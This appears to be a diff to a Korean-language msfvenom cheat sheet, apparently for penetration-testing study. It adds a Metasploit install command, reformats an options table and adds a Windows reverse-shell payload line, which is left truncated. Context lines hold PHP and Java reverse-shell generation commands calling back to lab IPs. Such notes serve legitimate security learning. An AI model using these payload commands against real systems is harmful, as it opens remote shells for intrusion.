@@ -7,16 +7,18 @@
 ## 기본 명령 구조
 
 ```bash
+apt install -y metasploit-framework
+
 msfvenom [options] -p <payload> LHOST=<IP> LPORT=<PORT>
 ```
 
-| 옵션 | 설명 |
-|------|------|
-| `-p` | 사용할 payload 모듈 |
-| `-f` | 결과 파일 형식 (raw, php, js, ...) |
-| `-e` | 추가로 사용할 encoding |
-| `-o` | 결과 파일을 특정 경로에 저장 |
-| `-list` | 사용 가능한 payload 목록 |
+| 옵션    | 설명                               |
+| ------- | ---------------------------------- |
+| `-p`    | 사용할 payload 모듈                |
+| `-f`    | 결과 파일 형식 (raw, php, js, ...) |
+| `-e`    | 추가로 사용할 encoding             |
+| `-o`    | 결과 파일을 특정 경로에 저장       |
+| `-list` | 사용 가능한 payload 목록           |
 
 ## payload 선택 예시
 
@@ -29,6 +31,9 @@ msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4444 -f raw -o shell.php
 
 # Java / Python 등
 msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
+
+# windows reverse shell
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.227 LPORT=443 -f exe -o
 ```
 
 ## handler 세팅 (공격자 측)
